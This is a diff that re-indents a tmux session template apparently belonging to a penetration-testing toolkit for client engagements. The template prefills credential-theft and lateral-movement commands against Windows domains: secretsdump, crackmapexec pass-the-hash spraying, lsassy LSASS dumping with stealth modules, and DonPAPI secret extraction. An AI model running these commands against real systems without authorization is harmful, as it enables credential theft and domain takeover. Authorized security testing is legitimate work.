@@ -18,27 +18,27 @@ root: /RSM/
 # create and cd into client/testing folder before running
 windows:
   - secretsdump: 
-      panes:
-        - secretsdump:
-          - tmux select-pane -T 'secretsdump' -t "localAdmin:secretsdump.0"
-          - <%= @settings["prefill"] %> "secretsdump.py '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>'@localAdminPC"; clear
+    panes:
+      - secretsdump:
+        - tmux select-pane -T 'secretsdump' -t "localAdmin:secretsdump.0"
+        - <%= @settings["prefill"] %> "secretsdump.py '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>'@localAdminPC"; clear
   - passTheHash: 
-      panes:
-        - passTheHash:
-          - tmux select-pane -T 'passTheHash' -t "localAdmin:passTheHash.0"
-          - <%= @settings["prefill"] %> "crackmapexec smb <%= @settings["rootDir"] %>/scans/masscanPortList/smb.lst --local-auth -u administrator -H hashValue --continue-on-success | tee <%= @settings["rootDir"] %>/scans/pth_spray.txt"; clear; echo -e "\e[0;31m --local-auth is necessary to avoid locking accounts out of the domain\n    - however, when computers are promoted to DC the local admin pass is used as DA pass. checking for reuse is viable (would have to remove --local-auth when testing DCs)\033[0m" 
+    panes:
+      - passTheHash:
+        - tmux select-pane -T 'passTheHash' -t "localAdmin:passTheHash.0"
+        - <%= @settings["prefill"] %> "crackmapexec smb <%= @settings["rootDir"] %>/scans/masscanPortList/smb.lst --local-auth -u administrator -H hashValue --continue-on-success | tee <%= @settings["rootDir"] %>/scans/pth_spray.txt"; clear; echo -e "\e[0;31m --local-auth is necessary to avoid locking accounts out of the domain\n    - however, when computers are promoted to DC the local admin pass is used as DA pass. checking for reuse is viable (would have to remove --local-auth when testing DCs)\033[0m" 
   - lsassy: 
-      panes:
-        - lsassy:
-          - tmux select-pane -T 'lsassy'; clear -t "localAdmin:lsassy.0"
-          - echo "lsassy targetMachine -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -m procdump_embedded"
-          - echo "lsassy targetMachine -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -m comsvcs_stealth"
-          - echo "lsassy targetMachine -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -m ppldump_embedded"
-          - echo "^optional modules for more covert attack methods using -m"
-          - <%= @settings["prefill"] %> "lsassy targetMachine -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %>"
+    panes:
+      - lsassy:
+        - tmux select-pane -T 'lsassy'; clear -t "localAdmin:lsassy.0"
+        - echo "lsassy targetMachine -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -m procdump_embedded"
+        - echo "lsassy targetMachine -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -m comsvcs_stealth"
+        - echo "lsassy targetMachine -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -m ppldump_embedded"
+        - echo "^optional modules for more covert attack methods using -m"
+        - <%= @settings["prefill"] %> "lsassy targetMachine -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %>"
   - DonPAPI: 
-      panes:
-        - DonPAPI:
-          - tmux select-pane -T 'DonPAPI' -t "localAdmin:DonPAPI.0"
-          - cd /opt/nomad-tools/DonPAPI || (git clone https://github.com/login-securite/DonPAPI.git /opt/nomad-tools/DonPAPI && cd /opt/nomad-tools/DonPAPI && pipenv install)
-          - <%= @settings["prefill"] %> pipenv run python3 DonPAPI.py DC-NetBIOS.'<%= @settings["domain"] %>/<%= @settings["pass"] %>:<%= @settings["pass"] %>'@$(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1); clear
+    panes:
+      - DonPAPI:
+        - tmux select-pane -T 'DonPAPI' -t "localAdmin:DonPAPI.0"
+        - cd /opt/nomad-tools/DonPAPI || (git clone https://github.com/login-securite/DonPAPI.git /opt/nomad-tools/DonPAPI && cd /opt/nomad-tools/DonPAPI && pipenv install)
+        - <%= @settings["prefill"] %> pipenv run python3 DonPAPI.py DC-NetBIOS.'<%= @settings["domain"] %>/<%= @settings["pass"] %>:<%= @settings["pass"] %>'@$(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1); clear
